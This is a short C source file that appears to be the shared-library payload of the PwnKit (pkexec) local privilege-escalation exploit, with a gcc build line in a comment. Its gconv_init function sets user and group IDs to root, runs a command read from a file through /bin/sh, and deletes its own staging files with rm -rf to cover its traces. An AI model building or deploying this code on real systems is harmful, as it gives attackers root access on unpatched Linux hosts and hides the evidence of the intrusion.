/*
gcc pwnkit.c -o pwnkit.so -shared -fPIC
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init()
{
	setuid(0);
	setgid(0);
	seteuid(0);
	setegid(0);
	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;cmmmmd=`cat ./pwnkit/commmmmand`;rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh -c \"$cmmmmd\"");
	exit(0);
}
